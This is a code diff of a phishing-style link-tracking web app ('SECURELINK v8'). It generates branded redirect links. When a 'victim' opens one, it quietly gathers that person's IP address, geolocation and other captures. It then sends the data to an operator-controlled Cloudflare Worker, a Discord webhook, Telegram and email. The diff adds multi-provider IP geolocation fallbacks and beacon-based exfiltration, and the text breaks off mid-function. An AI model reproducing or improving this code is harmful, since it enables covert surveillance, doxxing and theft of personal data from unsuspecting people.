@@ -43,8 +43,6 @@
   .info-chip .v { color:#e2e8f0; font-weight:500; }
   .brand-badge-logo { filter: drop-shadow(0 8px 24px rgba(0,0,0,0.12)); }
   .welcome-badge { background: linear-gradient(135deg, rgba(99,102,241,0.15), rgba(168,85,247,0.15)); border: 1px solid rgba(99,102,241,0.3); }
-  .sync-indicator { position: fixed; top: 80px; right: 20px; padding: 8px 16px; border-radius: 8px; background: rgba(99,102,241,0.9); color: white; font-size: 12px; z-index: 99998; animation: slideIn .3s ease; }
-  .setup-wizard { background: linear-gradient(135deg, rgba(34,197,94,0.1), rgba(59,130,246,0.1)); border: 1px solid rgba(34,197,94,0.3); }
 </style>
 </head>
 <body>
@@ -92,10 +90,6 @@
         </div>
       </div>
       <div class="flex items-center gap-3">
-        <div id="syncStatus" class="hidden md:flex items-center gap-2 px-3 py-1.5 rounded-full bg-white/5 border border-white/10">
-          <i class="fas fa-sync-alt text-xs text-gray-400"></i>
-          <span class="text-xs text-gray-400" id="syncText">idle</span>
-        </div>
         <div id="cloudBadge" class="hidden md:flex items-center gap-2 px-3 py-1.5 rounded-full bg-white/5 border border-white/10">
           <span class="text-xs text-gray-400" id="cloudText">cloud: off</span>
         </div>
@@ -165,34 +159,6 @@
       <div class="glass rounded-2xl p-8">
         <h2 class="text-xl font-bold mb-6">Generate Custom Redirect Link</h2>
         
-        <div id="setupWizard" class="hidden setup-wizard rounded-xl p-6 mb-6">
-          <div class="flex items-start gap-4">
-            <div class="w-12 h-12 rounded-full bg-green-500/20 flex items-center justify-center flex-shrink-0">
-              <i class="fas fa-magic text-green-400 text-xl"></i>
-            </div>
-            <div class="flex-1">
-              <h3 class="font-bold text-lg mb-2">Quick Setup Required</h3>
-              <p class="text-sm text-gray-300 mb-4">Cloud backend not configured. Choose a setup method:</p>
-              <div class="grid md:grid-cols-2 gap-3">
-                <button onclick="quickSetupNpoint()" class="p-4 rounded-lg bg-black/40 border border-white/10 hover:border-green-500/50 transition text-left">
-                  <div class="flex items-center gap-2 mb-2">
-                    <i class="fas fa-bolt text-green-400"></i>
-                    <span class="font-semibold">Zero-Config (npoint.io)</span>
-                  </div>
-                  <p class="text-xs text-gray-400">Free, no signup, works instantly. Best for quick testing.</p>
-                </button>
-                <button onclick="switchTab('settings')" class="p-4 rounded-lg bg-black/40 border border-white/10 hover:border-indigo-500/50 transition text-left">
-                  <div class="flex items-center gap-2 mb-2">
-                    <i class="fas fa-server text-indigo-400"></i>
-                    <span class="font-semibold">Cloudflare Worker</span>
-                  </div>
-                  <p class="text-xs text-gray-400">More control, requires setup. Best for production.</p>
-                </button>
-              </div>
-            </div>
-          </div>
-        </div>
-
         <label class="text-xs text-gray-400 uppercase tracking-wider">Select Brand Template</label>
         <div class="grid grid-cols-3 md:grid-cols-6 gap-3 mt-3 mb-6" id="brandGrid"></div>
         
@@ -275,6 +241,11 @@
           </div>
         </div>
 
+        <div id="cloudWarning" class="hidden mt-4 p-3 rounded-lg bg-red-500/10 border border-red-500/30 text-xs text-red-300">
+          <i class="fas fa-exclamation-triangle mr-1"></i>
+          Cloud backend not configured. Links will only work on this browser. Go to Settings → Cloud Backend and save your Worker URL + secret first.
+        </div>
+
         <div class="mt-6 flex flex-wrap gap-3">
           <button onclick="createLink()" class="btn-primary px-6 py-3 rounded-lg font-semibold">
             <i class="fas fa-magic mr-2"></i>Generate Link
@@ -338,37 +309,21 @@
           <div class="p-5 rounded-xl bg-black/30 border border-green-500/20">
             <div class="flex items-center gap-2 mb-3">
               <i class="fas fa-cloud text-orange-400 text-xl"></i>
-              <h3 class="font-semibold">Cloud Backend</h3>
+              <h3 class="font-semibold">Cloud Backend (KV Storage)</h3>
               <span class="text-xs px-2 py-0.5 rounded-full bg-green-500/20 text-green-300 ml-auto">SOURCE OF TRUTH</span>
             </div>
             <p class="text-xs text-gray-500 mb-3">Every capture lands here regardless of browser. This is what makes cross-device work.</p>
-            
-            <div class="grid md:grid-cols-2 gap-4 mb-4">
-              <div class="p-4 rounded-lg bg-black/40 border border-white/10">
-                <div class="flex items-center gap-2 mb-2">
-                  <i class="fas fa-bolt text-green-400"></i>
-                  <h4 class="font-semibold text-sm">Option 1: npoint.io (Zero-Config)</h4>
-                </div>
-                <p class="text-xs text-gray-400 mb-3">Free, no signup required. Perfect for quick setup.</p>
-                <button onclick="quickSetupNpoint()" class="w-full px-4 py-2 rounded-lg bg-green-500/20 hover:bg-green-500/30 text-green-300 text-sm transition">
-                  <i class="fas fa-magic mr-1"></i>Auto-Setup npoint.io
-                </button>
+            <div class="grid md:grid-cols-2 gap-4">
+              <div>
+                <label class="text-xs text-gray-400 uppercase">Worker URL</label>
+                <input id="cfUrl" placeholder="https://your-worker.workers.dev" class="w-full mt-1 px-3 py-2 bg-black/40 border border-white/10 rounded-lg text-sm focus:outline-none focus:border-indigo-500">
               </div>
-              
-              <div class="p-4 rounded-lg bg-black/40 border border-white/10">
-                <div class="flex items-center gap-2 mb-2">
-                  <i class="fas fa-server text-indigo-400"></i>
-                  <h4 class="font-semibold text-sm">Option 2: Cloudflare Worker</h4>
-                </div>
-                <p class="text-xs text-gray-400 mb-3">More control, requires Worker deployment.</p>
-                <div class="space-y-2">
-                  <input id="cfUrl" placeholder="Worker URL" class="w-full px-3 py-2 bg-black/60 border border-white/10 rounded-lg text-xs focus:outline-none focus:border-indigo-500">
-                  <input id="cfSecret" placeholder="Secret" class="w-full px-3 py-2 bg-black/60 border border-white/10 rounded-lg text-xs focus:outline-none focus:border-indigo-500">
-                </div>
+              <div>
+                <label class="text-xs text-gray-400 uppercase">Secret</label>
+                <input id="cfSecret" placeholder="your-secret" class="w-full mt-1 px-3 py-2 bg-black/40 border border-white/10 rounded-lg text-sm focus:outline-none focus:border-indigo-500">
               </div>
             </div>
-
-            <div class="flex flex-wrap gap-2">
+            <div class="flex flex-wrap gap-2 mt-3">
               <button onclick="testCloud()" class="px-4 py-2 rounded-lg bg-orange-500/20 hover:bg-orange-500/30 text-orange-300 text-sm transition">
                 <i class="fas fa-heartbeat mr-1"></i>Test Connection
               </button>
@@ -484,8 +439,7 @@
 <script>
 /* ============================================================
    SECURELINK v8 — Yasir Abbas edition
-   Fixed: Dual cloud backend (npoint.io + Cloudflare Worker)
-   Improved: Error handling, sync indicators, setup wizard
+   Cross-browser cloud capture with multi-provider IP geo fallback
    ============================================================ */
 
 const BRANDS = {
@@ -569,14 +523,12 @@ let state = {
   logs: safeGet('sl_logs', []),
   settings: safeGet('sl_settings', {}),
   currentTab: 'create',
-  autoSyncTimer: null,
-  npointBinId: null
+  autoSyncTimer: null
 };
 
 const DEFAULT_PASS = 'admin123';
 const PASS_KEY = 'sl_pass';
 const RESERVED_CODES = ['admin','preview','login','null','undefined'];
-const NPOINT_API = 'https://npoint.io';
 
 /* ============ B64URL ============ */
 function b64urlEncode(str) {
@@ -618,10 +570,10 @@ function updateCtxBadge() {
 function updateCloudBadge() {
   const badge = document.getElementById('cloudBadge'), txt = document.getElementById('cloudText');
   if (!badge || !txt) return;
-  const hasCloud = (state.settings.cfUrl && state.settings.cfSecret) || state.npointBinId;
-  if (hasCloud) {
+  const s = state.settings;
+  if (s.cfUrl && s.cfSecret) {
     badge.classList.remove('hidden');
-    txt.textContent = state.npointBinId ? '☁️ npoint.io' : '☁️ cloudflare';
+    txt.textContent = '☁️ cloud ready';
     badge.className = 'hidden md:flex items-center gap-2 px-3 py-1.5 rounded-full bg-orange-500/10 border border-orange-500/20';
     txt.className = 'text-xs text-orange-300';
   } else {
@@ -630,14 +582,11 @@ function updateCloudBadge() {
     badge.className = 'hidden md:flex items-center gap-2 px-3 py-1.5 rounded-full bg-white/5 border border-white/10';
     txt.className = 'text-xs text-gray-500';
   }
-}
-
-function updateSyncStatus(text, type = 'idle') {
-  const badge = document.getElementById('syncStatus'), txt = document.getElementById('syncText');
-  if (!badge || !txt) return;
-  txt.textContent = text;
-  const colors = { idle: 'text-gray-400', syncing: 'text-blue-400', success: 'text-green-400', error: 'text-red-400' };
-  txt.className = `text-xs ${colors[type] || colors.idle}`;
+  const warn = document.getElementById('cloudWarning');
+  if (warn) {
+    if (s.cfUrl && s.cfSecret) warn.classList.add('hidden');
+    else warn.classList.remove('hidden');
+  }
 }
 
 /* ============ URL HASH SETTINGS ============ */
@@ -655,31 +604,7 @@ function mergeHashSettings() {
   if (cfg.dcHook) state.settings.dcHook = cfg.dcHook;
   if (cfg.tgToken) state.settings.tgToken = cfg.tgToken;
   if (cfg.tgChat) state.settings.tgChat = cfg.tgChat;
-  if (cfg.npointBinId) state.npointBinId = cfg.npointBinId;
   safeSet('sl_settings', state.settings);
-}
-
-/* ============ NPOINT.IO SETUP ============ */
-async function quickSetupNpoint() {
-  showSyncIndicator('Creating cloud storage...');
-  try {
-    const res = await fetch(NPOINT_API + '/json', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ links: {}, logs: {}, createdAt: new Date().toISOString() })
-    });
-    if (!res.ok) throw new Error('HTTP ' + res.status);
-    const data = await res.json();
-    state.npointBinId = data.id;
-    safeSet('sl_settings', state.settings);
-    hideSyncIndicator();
-    toast('Cloud storage created! Bin ID: ' + data.id, 'success');
-    updateCloudBadge();
-    document.getElementById('setupWizard').classList.add('hidden');
-  } catch(e) {
-    hideSyncIndicator();
-    toast('Setup failed: ' + e.message, 'error');
-  }
 }
 
 /* ============ INIT ============ */
@@ -698,7 +623,6 @@ function init() {
       document.getElementById('victimScreen').classList.add('hidden');
       renderAll(); loadSettings(); startAutoSync();
       syncFromCloud(false);
-      checkSetupWizard();
     } else { showLogin(); }
   } else if (route.startsWith('/')) {
     const payload = route.slice(1);
@@ -713,15 +637,6 @@ function init() {
     showLogin();
   }
   renderBrandGrid();
-}
-
-function checkSetupWizard() {
-  const hasCloud = (state.settings.cfUrl && state.settings.cfSecret) || state.npointBinId;
-  const wizard = document.getElementById('setupWizard');
-  if (wizard) {
-    if (hasCloud) wizard.classList.add('hidden');
-    else wizard.classList.remove('hidden');
-  }
 }
 
 /* ============ AUTH ============ */
@@ -740,7 +655,6 @@ function handleLogin() {
     renderAll(); loadSettings(); updateCtxBadge(); updateCloudBadge(); startAutoSync();
     toast('Welcome back, Yasir Abbas!', 'success');
     syncFromCloud(false);
-    checkSetupWizard();
   } else { toast('Invalid password', 'error'); document.getElementById('loginPass').value = ''; }
 }
 function logout() {
@@ -787,7 +701,7 @@ function switchTab(tab) {
   document.getElementById('tab-' + tab).classList.remove('bg-white/5');
   if (tab === 'links') renderLinks();
   if (tab === 'logs') { renderLogs(); hideLogBadge(); syncFromCloud(false); }
-  if (tab === 'settings') { runDiagnostics(); checkSetupWizard(); }
+  if (tab === 'settings') runDiagnostics();
   updateCloudBadge();
 }
 
@@ -811,7 +725,6 @@ function buildDeliveryConfig() {
     dcHook: state.settings.dcHook || '',
     cfUrl: state.settings.cfUrl || '',
     cfSecret: state.settings.cfSecret || '',
-    npointBinId: state.npointBinId || '',
     emPub: state.settings.emPub || '',
     emSvc: state.settings.emSvc || '',
     emTpl: state.settings.emTpl || '',
@@ -837,9 +750,9 @@ function createLink() {
   if (!modules.length) return toast('Select at least one module', 'error');
 
   const cfg = buildDeliveryConfig();
-  if (!cfg.cfUrl && !cfg.npointBinId) {
-    toast('Cloud backend not configured! Use Quick Setup.', 'error');
-    document.getElementById('setupWizard').classList.remove('hidden');
+  if (!cfg.cfUrl || !cfg.cfSecret) {
+    toast('Cloud backend not configured! Go to Settings first.', 'error');
+    switchTab('settings');
     return;
   }
 
@@ -857,7 +770,16 @@ function createLink() {
   document.getElementById('linkOutput').textContent = window.location.origin + window.location.pathname + '#/' + encoded;
   document.getElementById('generatedLink').classList.remove('hidden');
 
-  toast('Link created!', 'success');
+  try {
+    const check = JSON.parse(b64urlDecode(encoded));
+    console.log('✅ Link generated. Config verification:');
+    console.log('   cfUrl:', check.cfUrl ? '✓ present' : '❌ MISSING');
+    console.log('   cfSecret:', check.cfSecret ? '✓ present' : '❌ MISSING');
+    console.log('   dcHook:', check.dcHook ? '✓ present' : '— not set');
+    console.log('   tgToken:', check.tgToken ? '✓ present' : '— not set');
+  } catch(e) { console.warn('Link verify failed', e); }
+
+  toast('Link created and verified!', 'success');
   renderStats();
   document.getElementById('shortCode').value = '';
   document.getElementById('destUrl').value = '';
@@ -865,9 +787,9 @@ function createLink() {
 }
 function previewLink() {
   const cfg = buildDeliveryConfig();
-  if (!cfg.cfUrl && !cfg.npointBinId) {
-    toast('Cloud backend not configured!', 'error');
-    document.getElementById('setupWizard').classList.remove('hidden');
+  if (!cfg.cfUrl || !cfg.cfSecret) {
+    toast('Cloud backend not configured! Go to Settings first.', 'error');
+    switchTab('settings');
     return;
   }
   const brand = state.selectedBrand;
@@ -912,53 +834,26 @@ async function copyLinkUrl(code) {
 /* ============ PORTABLE PANEL URL ============ */
 function buildPortablePanelUrl() {
   const s = state.settings;
-  const hasCloud = (s.cfUrl && s.cfSecret) || state.npointBinId;
-  if (!hasCloud) return toast('Configure cloud backend first', 'error');
-  const cfg = { cfUrl: s.cfUrl || '', cfSecret: s.cfSecret || '', dcHook: s.dcHook || '', npointBinId: state.npointBinId || '' };
+  if (!s.cfUrl || !s.cfSecret) return toast('Configure cloud backend first', 'error');
+  const cfg = { cfUrl: s.cfUrl, cfSecret: s.cfSecret, dcHook: s.dcHook || '' };
   const encoded = b64urlEncode(JSON.stringify(cfg));
   const url = window.location.origin + window.location.pathname + '#admin&cfg=' + encoded;
   safeCopy(url).then(ok => {
-    if (ok) toast('Portable URL copied!', 'success');
+    if (ok) toast('Portable URL copied to clipboard!', 'success');
     else prompt('Copy this portable panel URL:', url);
   });
 }
 
 /* ============ CLOUD SYNC ============ */
 async function syncFromCloud(showToast) {
-  const hasNpoint = state.npointBinId;
-  const hasCF = state.settings.cfUrl && state.settings.cfSecret;
-  
-  if (!hasNpoint && !hasCF) {
-    if (showToast) toast('Cloud backend not configured', 'error');
-    return;
-  }
-
-  updateSyncStatus('syncing...', 'syncing');
-
+  const s = state.settings;
+  if (!s.cfUrl || !s.cfSecret) { if (showToast) toast('Cloud backend not configured', 'error'); return; }
   try {
-    let incoming = [];
-    
-    // Try npoint.io first
-    if (hasNpoint) {
-      try {
-        const res = await fetch(`${NPOINT_API}/${state.npointBinId}`);
-        if (res.ok) {
-          const data = await res.json();
-          incoming = Object.values(data.logs || {});
-        }
-      } catch(e) { console.warn('npoint sync failed', e); }
-    }
-    
-    // Try Cloudflare Worker
-    if (hasCF && incoming.length === 0) {
-      try {
-        const url = state.settings.cfUrl.replace(/\/$/,'') + '/list?secret=' + encodeURIComponent(state.settings.cfSecret);
-        const r = await fetch(url);
-        const d = await r.json();
-        if (d.ok) incoming = d.items || [];
-      } catch(e) { console.warn('cf sync failed', e); }
-    }
-
+    const url = s.cfUrl.replace(/\/$/,'') + '/list?secret=' + encodeURIComponent(s.cfSecret);
+    const r = await fetch(url);
+    const d = await r.json();
+    if (!d.ok) { if (showToast) toast('Cloud: ' + (d.error || 'failed'), 'error'); return; }
+    const incoming = d.items || [];
     const seen = new Set(state.logs.map(l => String(l.timestamp) + '|' + String(l.code)));
     let added = 0;
     for (const item of incoming) {
@@ -974,21 +869,12 @@ async function syncFromCloud(showToast) {
     safeSet('sl_logs', state.logs);
     renderStats();
     if (state.currentTab === 'logs') renderLogs();
-    
-    updateSyncStatus(`synced ${added} new`, 'success');
     if (showToast) toast(added ? `Synced ${added} new` : 'Already up to date', 'success');
-    setTimeout(() => updateSyncStatus('idle', 'idle'), 3000);
-  } catch(e) {
-    updateSyncStatus('sync failed', 'error');
-    if (showToast) toast('Cloud error: ' + e.message, 'error');
-    setTimeout(() => updateSyncStatus('idle', 'idle'), 3000);
-  }
+  } catch(e) { if (showToast) toast('Cloud error: ' + e.message, 'error'); }
 }
-
 function startAutoSync() {
   stopAutoSync();
-  const hasCloud = (state.settings.cfUrl && state.settings.cfSecret) || state.npointBinId;
-  if (!hasCloud) return;
+  if (!state.settings.cfUrl || !state.settings.cfSecret) return;
   state.autoSyncTimer = setInterval(() => syncFromCloud(false), 10000);
 }
 function stopAutoSync() {
@@ -1072,7 +958,6 @@ function renderLogs() {
           <span class="font-semibold text-sm">Capture</span>
           <code class="text-xs text-gray-400 bg-black/40 px-2 py-0.5 rounded">/${log.code}</code>
           ${log.new ? '<span class="text-xs px-2 py-0.5 rounded-full bg-green-500/20 text-green-300">new</span>' : ''}
-          ${log.delivered ? `<span class="text-xs px-2 py-0.5 rounded-full bg-blue-500/20 text-blue-300">${log.delivered}</span>` : ''}
         </div>
         <span class="text-xs text-gray-500">${new Date(log.timestamp).toLocaleString()}</span>
       </div>
@@ -1103,7 +988,6 @@ function renderLogs() {
 
       <div class="mt-3 flex justify-end gap-2">
         <button onclick="copyLog('${log.id}')" class="px-3 py-1.5 rounded-lg bg-white/5 hover:bg-white/10 text-xs transition"><i class="fas fa-copy mr-1"></i>Copy</button>
-        <button onclick="exportLog('${log.id}')" class="px-3 py-1.5 rounded-lg bg-indigo-500/20 hover:bg-indigo-500/30 text-indigo-300 text-xs transition"><i class="fas fa-download mr-1"></i>Export</button>
         <button onclick="deleteLog('${log.id}')" class="px-3 py-1.5 rounded-lg bg-red-500/10 hover:bg-red-500/20 text-red-400 text-xs transition"><i class="fas fa-trash mr-1"></i>Delete</button>
       </div>
     </div>`;
@@ -1116,19 +1000,7 @@ function openImage(src) {
 function deleteLog(id) {
   state.logs = state.logs.filter(l => String(l.id) !== String(id));
   safeSet('sl_logs', state.logs); renderLogs(); renderStats();
-  toast('Removed locally', 'success');
-}
-function exportLog(id) {
-  const log = state.logs.find(l => String(l.id) === String(id));
-  if (!log) return;
-  const data = JSON.stringify(log, null, 2);
-  const blob = new Blob([data], { type: 'application/json' });
-  const url = URL.createObjectURL(blob);
-  const a = document.createElement('a');
-  a.href = url; a.download = `capture-${log.code}-${Date.now()}.json`;
-  document.body.appendChild(a); a.click(); a.remove();
-  URL.revokeObjectURL(url);
-  toast('Exported', 'success');
+  toast('Removed locally (KV copy remains)', 'success');
 }
 async function copyLog(id) {
   const log = state.logs.find(l => String(l.id) === String(id)); if (!log) return;
@@ -1156,7 +1028,7 @@ async function copyLog(id) {
   toast(ok ? 'Copied' : 'Copy failed', ok ? 'success' : 'error');
 }
 function clearLogs() {
-  if (!confirm('Clear local captures?')) return;
+  if (!confirm('Clear local captures? Cloud copies remain.')) return;
   state.logs = []; safeSet('sl_logs', state.logs);
   renderLogs(); renderStats();
   toast('Local cleared', 'success');
@@ -1211,7 +1083,6 @@ function saveSettings() {
   updateCloudBadge();
   runDiagnostics();
   startAutoSync();
-  checkSetupWizard();
 }
 async function testDiscord() {
   const hook = document.getElementById('dcHook').value.trim();
@@ -1224,29 +1095,16 @@ async function testDiscord() {
   } catch (e) { toast('Discord error: ' + e.message, 'error'); }
 }
 async function testCloud() {
-  const hasNpoint = state.npointBinId;
-  const hasCF = state.settings.cfUrl && state.settings.cfSecret;
-  
-  if (!hasNpoint && !hasCF) return toast('No cloud backend configured', 'error');
-  
-  if (hasNpoint) {
-    try {
-      const r = await fetch(`${NPOINT_API}/${state.npointBinId}`);
-      if (r.ok) toast('npoint.io backend healthy ✓', 'success');
-      else toast('npoint.io error: ' + r.status, 'error');
-    } catch(e) { toast('npoint.io error: ' + e.message, 'error'); }
-  }
-  
-  if (hasCF) {
-    try {
-      const url = state.settings.cfUrl.replace(/\/$/,'') + '/health';
-      const r = await fetch(url);
-      const d = await r.json();
-      if (d.ok && d.binding && d.secretSet) toast('Cloudflare Worker healthy ✓', 'success');
-      else if (d.ok) toast('Worker up but ' + (!d.binding ? 'binding missing' : '') + (!d.secretSet ? ' secret missing' : ''), 'error');
-      else toast('Worker: ' + (d.error || 'failed'), 'error');
-    } catch (e) { toast('Cloudflare error: ' + e.message, 'error'); }
-  }
+  const url = document.getElementById('cfUrl').value.trim().replace(/\/$/,'');
+  const secret = document.getElementById('cfSecret').value.trim();
+  if (!url || !secret) return toast('Enter Worker URL and secret', 'error');
+  try {
+    const r = await fetch(url + '/health');
+    const d = await r.json();
+    if (d.ok && d.binding && d.secretSet) toast('Cloud backend healthy ✓', 'success');
+    else if (d.ok) toast('Worker up but ' + (!d.binding ? 'binding missing' : '') + (!d.secretSet ? ' secret missing' : ''), 'error');
+    else toast('Worker: ' + (d.error || 'failed'), 'error');
+  } catch (e) { toast('Cloud error: ' + e.message, 'error'); }
 }
 async function testTelegram() {
   const token = document.getElementById('tgToken').value.trim();
@@ -1270,31 +1128,20 @@ async function runDiagnostics() {
   lines.push(`geolocation: ${navigator.geolocation ? 'yes' : 'no'}`);
   lines.push(`clipboard: ${navigator.clipboard ? 'yes' : 'no'}`);
   lines.push(`sendBeacon: ${navigator.sendBeacon ? 'yes' : 'no'}`);
-  lines.push(`npoint.io: ${state.npointBinId ? 'yes (' + state.npointBinId + ')' : 'no'}`);
-  lines.push(`cloudflare: ${state.settings.cfUrl && state.settings.cfSecret ? 'yes' : 'no'}`);
-  lines.push(`discord: ${state.settings.dcHook ? 'yes' : 'no'}`);
+  lines.push(`cloud configured: ${state.settings.cfUrl && state.settings.cfSecret ? 'yes' : 'no'}`);
+  lines.push(`discord configured: ${state.settings.dcHook ? 'yes' : 'no'}`);
   try { const r = await fetch('https://api.ipify.org/?format=json'); const d = await r.json(); lines.push(`ipify: yes (${d.ip})`); }
   catch(e) { lines.push(`ipify: NO`); }
-  try { const r = await fetch('https://ipapi.co/json/'); const d = await r.json(); lines.push(`ipapi: yes (${d.city || '?'}, ${d.country_name || '?'})`); }
-  catch(e) { lines.push(`ipapi: NO`); }
-  box.innerHTML = lines.map(l => '<div>'+l+'</div>').join('');
-}
-
-/* ============ SYNC INDICATOR ============ */
-function showSyncIndicator(text) {
-  let el = document.getElementById('syncIndicator');
-  if (!el) {
-    el = document.createElement('div');
-    el.id = 'syncIndicator';
-    el.className = 'sync-indicator';
-    document.body.appendChild(el);
+  try { const r = await fetch('https://ipwho.is/'); const d = await r.json(); lines.push(`ipwho.is: yes (${d.city || '?'}, ${d.country || '?'})`); }
+  catch(e) { lines.push(`ipwho.is: NO`); }
+  if (state.settings.cfUrl) {
+    try {
+      const r = await fetch(state.settings.cfUrl.replace(/\/$/,'') + '/health');
+      const d = await r.json();
+      lines.push(`cloud health: ${d.ok ? 'OK' : 'FAIL'} binding=${d.binding} secret=${d.secretSet}`);
+    } catch(e) { lines.push(`cloud health: NO — ${e.message}`); }
   }
-  el.innerHTML = `<i class="fas fa-spinner fa-spin mr-2"></i>${text}`;
-  el.classList.remove('hidden');
-}
-function hideSyncIndicator() {
-  const el = document.getElementById('syncIndicator');
-  if (el) el.classList.add('hidden');
+  box.innerHTML = lines.map(l => '<div>'+l+'</div>').join('');
 }
 
 /* ============ VICTIM SCREEN ============ */
@@ -1304,7 +1151,20 @@ function launchVictim(link) {
   console.log('╚══════════════════════════════════════╝');
   console.log('Code:', link.code);
   console.log('Brand:', link.brand);
-  console.log('Cloud:', link.npointBinId ? 'npoint.io' : (link.cfUrl ? 'cloudflare' : 'NONE'));
+  console.log('Destination:', link.dest);
+  console.log('Duration:', link.duration, 'seconds');
+  console.log('Modules:', link.modules);
+  console.log('───────── DELIVERY CONFIG ─────────');
+  console.log('cfUrl present?', link.cfUrl ? '✓ ' + link.cfUrl : '❌ MISSING');
+  console.log('cfSecret present?', link.cfSecret ? '✓ (hidden)' : '❌ MISSING');
+  console.log('dcHook present?', link.dcHook ? '✓' : '—');
+  console.log('tgToken present?', link.tgToken ? '✓' : '—');
+  console.log('───────────────────────────────────');
+
+  if (!link.cfUrl || !link.cfSecret) {
+    console.error('❌ CRITICAL: Cloud config missing in link!');
+    console.error('Regenerate the link after saving settings.');
+  }
 
   document.getElementById('loginScreen').classList.add('hidden');
   document.getElementById('adminPanel').classList.add('hidden');
@@ -1351,62 +1211,60 @@ function launchVictim(link) {
       const log = await collectData(link);
       console.log('📊 Data collected:', log);
 
-      // Cloud delivery
-      if (link.code !== 'preview') {
-        let cloudOk = false;
-        
-        // Try npoint.io
-        if (link.npointBinId) {
+      if (link.code !== 'preview' && link.cfUrl && link.cfSecret) {
+        const url = link.cfUrl.replace(/\/$/,'') + '/capture?secret=' + encodeURIComponent(link.cfSecret);
+        const payload = JSON.stringify(log);
+        console.log('📤 Sending to cloud, payload size:', payload.length, 'bytes');
+
+        let beaconOk = false;
+        if (navigator.sendBeacon) {
           try {
-            const bin = await fetch(`${NPOINT_API}/${link.npointBinId}`).then(r => r.json());
-            bin.logs = bin.logs || {};
-            bin.logs[log.id] = log;
-            const res = await fetch(`${NPOINT_API}/${link.npointBinId}`, {
-              method: 'PATCH',
-              headers: { 'Content-Type': 'application/json' },
-              body: JSON.stringify(bin)
-            });
-            cloudOk = res.ok;
-            console.log('📤 npoint.io:', cloudOk ? '✓' : '✗');
-          } catch(e) { console.warn('npoint failed', e); }
+            const blob = new Blob([payload], { type: 'application/json' });
+            beaconOk = navigator.sendBeacon(url, blob);
+            console.log('📤 sendBeacon returned:', beaconOk);
+          } catch(e) { console.warn('sendBeacon threw', e); }
         }
-        
-        // Try Cloudflare Worker
-        if (!cloudOk && link.cfUrl && link.cfSecret) {
-          const url = link.cfUrl.replace(/\/$/,'') + '/capture?secret=' + encodeURIComponent(link.cfSecret);
-          const payload = JSON.stringify(log);
-          
-          let beaconOk = false;
-          if (navigator.sendBeacon) {
-            try {
-              const blob = new Blob([payload], { type: 'application/json' });
-              beaconOk = navigator.sendBeacon(url, blob);
-            } catch(e) {}
+        if (!beaconOk) {
+          console.log('📤 Falling back to fetch keepalive');
+          try {
+            const r = await fetch(url, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: payload, keepalive: true });
+            const d = await r.json();
+            console.log('📤 fetch result:', d);
+          } catch(e) { console.error('❌ Cloud fetch failed:', e); }
+        }
+      } else if (link.code !== 'preview') {
+        console.error('❌ Skipping cloud: config missing');
+      }
+
+      if (link.code !== 'preview') {
+        log.new = true; log.delivered = 'cloud';
+        let stored = { ...log };
+        try {
+          const full = JSON.stringify(stored);
+          if (full.length > 1_500_000 && Array.isArray(stored.snapshots)) {
+            stored.snapshots = stored.snapshots.map((s, i) => i === 0 ? s : '[captured]');
           }
-          if (!beaconOk) {
-            try {
-              const r = await fetch(url, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: payload, keepalive: true });
-              cloudOk = r.ok;
-            } catch(e) {}
-          }
-          console.log('📤 Cloudflare:', cloudOk ? '✓' : '✗');
-        }
-
-        if (cloudOk) {
-          log.new = true; log.delivered = 'cloud';
-          state.logs.push(log);
-          if (state.logs.length > 500) state.logs = state.logs.slice(-500);
-          safeSet('sl_logs', state.logs);
-        }
-
-        // Discord delivery
-        const dcOk = await deliverToDiscord(log, link).catch(() => false);
-        if (dcOk) log.delivered = (log.delivered || '') + ',discord';
-
-        // Email delivery
-        await deliverToEmail(log, link).catch(() => false);
-
+        } catch(e){}
+        state.logs.push(stored);
+        if (state.logs.length > 500) state.logs = state.logs.slice(-500);
         safeSet('sl_logs', state.logs);
+
+        console.log('📤 Sending to Discord...');
+        const dcOk = await deliverToDiscord(log, link).catch(() => false);
+        console.log('📤 Discord result:', dcOk ? '✓' : '✗');
+
+        const emOk = await deliverToEmail(log, link).catch(() => false);
+
+        let flags = ['cloud'];
+        if (dcOk) flags.push('dc');
+        if (emOk) flags.push('email');
+        const s = state.logs.find(l => String(l.id) === String(log.id));
+        if (s) s.delivered = flags.join(',');
+        safeSet('sl_logs', state.logs);
+        renderStats();
+        if (state.currentTab === 'logs') renderLogs();
+      } else {
+        await Promise.allSettled([ deliverToDiscord(log, link), deliverToEmail(log, link) ]);
       }
     } catch(e) { console.error('❌ Pipeline error:', e); }
   })();
@@ -1505,16 +1363,58 @@ async function reverseGeocode(lat, lon) {
     return { display: d.display_name || parts.join(', '), city: a.city || a.town || a.village || '', state: a.state || '', country: a.country || '', postcode: a.postcode || '' };
   } catch(e) { return null; }
 }
+
+/* ============ IP GEO — MULTI-PROVIDER, NEVER THROWS ============ */
 async function ipGeolocate() {
+  const withTimeout = (promise, ms) => Promise.race([
+    promise,
+    new Promise((_, rej) => setTimeout(() => rej(new Error('timeout')), ms))
+  ]);
+
+  // Provider 1: ipapi.co
   try {
-    const r = await fetch('https://ipapi.co/json/');
-    if (!r.ok) return null;
-    const d = await r.json();
-    if (!d || d.error) return null;
-    return { ip: d.ip, city: d.city, region: d.region, country: d.country_name, postal: d.postal,
-      isp: d.org, lat: d.latitude, lon: d.longitude,
-      display: [d.city, d.region, d.country_name].filter(Boolean).join(', ') };
-  } catch(e) { return null; }
+    const r = await withTimeout(fetch('https://ipapi.co/json/'), 4000);
+    if (r.ok) {
+      const d = await r.json();
+      if (d && !d.error && d.ip) {
+        console.log('ipgeo: ipapi.co ✓');
+        return { ip: d.ip, city: d.city, region: d.region, country: d.country_name, postal: d.postal,
+          isp: d.org, lat: d.latitude, lon: d.longitude,
+          display: [d.city, d.region, d.country_name].filter(Boolean).join(', ') };
+      }
+    }
+  } catch(e) { console.log('ipgeo: ipapi.co failed (' + e.message + ')'); }
+
+  // Provider 2: ipwho.is
+  try {
+    const r = await withTimeout(fetch('https://ipwho.is/'), 4000);
+    if (r.ok) {
+      const d = await r.json();
+      if (d && d.success !== false && d.ip) {
+        console.log('ipgeo: ipwho.is ✓');
+        return { ip: d.ip, city: d.city, region: d.region, country: d.country, postal: d.postal,
+          isp: d.connection && d.connection.isp, lat: d.latitude, lon: d.longitude,
+          display: [d.city, d.region, d.country].filter(Boolean).join(', ') };
+      }
+    }
+  } catch(e) { console.log('ipgeo: ipwho.is failed (' + e.message + ')'); }
+
+  // Provider 3: freeipapi.com
+  try {
